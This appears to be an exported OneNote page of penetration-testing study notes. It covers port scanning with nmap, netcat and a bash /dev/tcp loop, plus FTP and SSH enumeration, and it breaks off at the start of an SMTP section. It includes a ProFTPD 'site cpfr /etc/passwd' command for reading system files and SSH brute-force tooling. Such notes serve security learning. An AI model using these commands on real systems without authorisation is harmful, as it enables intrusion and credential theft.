
<html xmlns:o="urn:schemas-microsoft-com:office:office"
xmlns:dt="uuid:C2F41010-65B3-11d1-A29F-00AA00C14882"
xmlns="http://www.w3.org/TR/REC-html40">

<head>
<meta http-equiv=Content-Type content="text/html; charset=utf-8">
<meta name=ProgId content=OneNote.File>
<meta name=Generator content="Microsoft OneNote 15">
<link id=Main-File rel=Main-File href=Enumeration.htm>
<link rel=File-List href="Enumeration_files/filelist.xml">
</head>

<body lang=en-US style='font-family:Calibri;font-size:11.0pt'>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:7.1277in'>

<div style='direction:ltr;margin-top:0in;margin-left:.075in;width:2.0701in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>Port
Scanning</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:.075in;width:2.4777in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Monday,
February 8, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>11:32
AM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:7.1277in'>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>If tools can't find service
     version then use wireshark.</span></li>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Running scan with -sV and -sC
     at the same time or each separately can give different responses in some
     cases.</span></li>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>If UDP shows open|filtered
     then run scripts with sC.<span style='mso-spacerun:yes'>  </span>Th
is will
     be more likely to get a response from the port to confirm if it is open or
     not</span></li>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Sometimes open ports only
     show up while using -sT (rare.<span style='mso-spacerun:yes'>�
     </span>Maybe only an ISAKMP/ipsec issue?)</span></li>
</ul>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Nmap:</p>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Output all open ports to
     comma list</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>sudo nmap -p- &lt;ip address
      &gt; -oA</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>cat &lt;nmap scan&gt;.nmap |
      grep open | awk -F/ '{print $1}' ORS=','</span></li>
 </ul>
</ul>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:5.6229in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Show justification
  for scan results</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.1583in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>--reason</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:5.6229in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Banner grab /
  version detection</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.1583in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-sV</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:5.6229in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&quot;Safe
  scripts&quot;.<span style='mso-spacerun:yes'>  </span>Default scrip
  scan.<span style='mso-spacerun:yes'>  </span>Some are intrusive.</p
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.1583in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-sC</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:5.6229in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Top 1000 ports</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.1805in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>--top-ports 1000</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:5.6229in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>UDP scan</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.1583in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-sU</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:5.6229in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>TCP scan</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.1583in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-sT</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:5.6229in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>TCP &amp; UDP scan</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.1583in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-sTU</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:5.6423in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Packets per second
  to send</p>
  <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>nmap may send less if:</span></li>
   <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>It has nothing to send</span></li>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Hardware limit</span></li>
   </ul>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>If set too high it may
       cause network congestion and cause the scan to take longer</span></li>
  </ul>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.1388in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>--min-rate
  &lt;#&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:5.6229in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Number of retries
  per non-responsive port (Default:10)</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.2277in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>--max-retries
  &lt;#&gt;</p>
  </td>
 </tr>
</table>

</div>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>netcat:</p>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.0944in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>TCP Port Scan</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:2.4826in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>nc -nvv -w 1 -z
  ip.address port#-port#</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.1138in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>UDP Port Scan</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:2.5243in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>nc -nv -u -z -w 1
  ip.address port#-port#</p>
  </td>
 </tr>
</table>

</div>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-w: Connection
timeout in seconds</p>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-z: Specify zero-I/O
mode which will send no data and is used for scanning</p>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>UDP Scanning relies
on the server to send back a &quot;ICMP Port Unreachable&quot; message to know
if a port is open or closed.<span style='mso-spacerun:yes'>  </span>If t
he
server doesn't send back this message (port is filtered by a firewall, etc)
then the port will look like it is open when it is not.</p>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.9909in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Bash script for
  port scanning</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.9159in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.4pt'>#!/bin/bash
  host=10.5.5.11</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.4pt'>for port in
  {1..65535}; do</p>
  <p style='margin:0in;margin-left:.375in;font-family:Calibri;font-size:11.4pt'>timeout
  .1 bash -c &quot;echo &gt;/dev/tcp/$host/$port&quot; &amp;&amp;</p>
  <p style='margin:0in;margin-left:.375in;font-family:Calibri;font-size:11.4pt'>echo
  &quot;port $port is open&quot;</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.4pt'>done</p>
  <p style='margin:0in;font-family:Calibri;font-size:11.4pt'>echo
  &quot;Done&quot;</p>
  </td>
 </tr>
</table>

</div>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Massscan -
(arguably) the fastest port scanner.<span style='mso-spacerun:yes'>  </s
pan>Can
scan the entire internet in about 6 minutes.</p>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:6.8423in'>

<div style='direction:ltr;margin-top:0in;margin-left:.2486in;width:1.9326in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>21 TCP / FTP</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:.2486in;width:2.5347in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Wednesday,
March 24, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>9:41
AM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:6.8423in'>

<ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:0in'>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>If FTP is rejecting user
      login without asking for password then we can enumerate users</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Tools</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>ftp</span></li>
  </ul>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt;margin-left:.3333in' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.6715in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Connect to server</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.8194in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>ftp
   &lt;ip.addess&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.6715in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Upload file</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.8194in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>put &lt;file&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.6715in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Download file</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.8194in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>get &lt;file&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.6715in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Upload multiple
   files</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.8888in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>mput &lt;files -
   ex. mput *.txt&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.6909in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Download multiple
   files</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.8694in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>mget &lt;files -
   ex. mget *.txt&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.6715in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Local current
   directory</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.8194in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>lcd</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.6715in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Set binary mode</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.8194in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>binary</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.6715in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.8194in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>wget</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt;margin-left:.3333in' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.4041in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Recursively
   download FTP contents</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.7958in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>wget -r <a
   href="ftp://&lt;user&gt;@10.129.2.28">ftp://&lt;user&gt;@10.129.2.28</a>
   --password=&lt;password&gt;<br>
      wget -r <a href="ftp://&lt;user&gt;:&lt;passwrod&gt;@&lt;ip&gt;">ftp://&lt;user&gt;:&lt;passwrod&gt;@&lt;ip&gt;</a></p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.3847in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Mirror FTP</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.7458in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>wget --mirror <a
   href="ftp://&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;">ftp://&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;</a></p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Proftp</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Can copy file from remote
       directory to a ftp directory</span></li>
  </ul>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt;margin-left:.3333in' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.9888in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Connect to FTP
   server</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.4465in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>telnet &lt;ip&gt;
   &lt;port&gt;</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.9888in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>select file to
   copy</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.4465in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>site cpfr
   /etc/passwd</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.0083in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>select location
   to copy file to</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:2.4965in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>site cpto
   /&lt;remote directory&gt;/passwd</p>
   </td>
  </tr>
 </table>
 </div>
</ul>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:7.077in'>

<div style='direction:ltr;margin-top:0in;margin-left:.075in;width:1.9527in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>22 TCP / SSH</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:.075in;width:2.3562in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Wednesday,
April 7, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>2:38
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:7.077in'>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Most common attack is brute
     forcing</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Gathered list of usernames
      and default usernames</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Create a wordlist CeWl</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Brute force with Hydra
      (don't forget about &quot;-e [VALUES]&quot;)</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Can fuzz password using
      patator</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Crowbar for brute forcing
      private keys</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Metasploit ssh_login</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Brute forcing can cause the
      machine to lock you out.<span style='mso-spacerun:yes'>  </span>Th
is
      could be for a set period of time.</span></li>
 </ul>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Sometimes the password prompt
     is disabled and can only login using a private key</span></li>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>SSH Key fingerprint</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Based on the hosts public
      key</span></li>
  <ul type=square style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>/etc/ssh/ssh_host_rsa_key.pub</span></li>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Used for easy
       identification of the key you are connecting to</span></li>
  </ul>
 </ul>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>sshpass</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>pass cleartext password over
      command line</span></li>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>sshpass &lt;cleartext
      password&gt; ssh &lt;user&gt;@&lt;ssh server&gt;</span></li>
 </ul>
</ul>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.1354in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Connect with
  different key exchange algorithm</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.7791in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-oKexAlgorithms=+&lt;algorithm&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.1159in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Allow to connect
  with different type of key</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.8673in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>-oPubkeyAcceptedKeyTypes=+&lt;key
  type - example: ssh-dss&gt;</p>
  </td>
 </tr>
</table>

</div>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:7.575in'>

<div style='direction:ltr;margin-top:0in;margin-left:.075in;width:2.1652in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>25 TCP /
SMTP</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:.075in;width:2.3986in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>Monday,
February 8, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#666666'>4:41
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:7.575in'>

<ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
 margin-bottom:0in'>
 <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
     style='font-family:Calibri;font-size:11.0pt'>Simple Mail Transfer Protocol</span></li>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
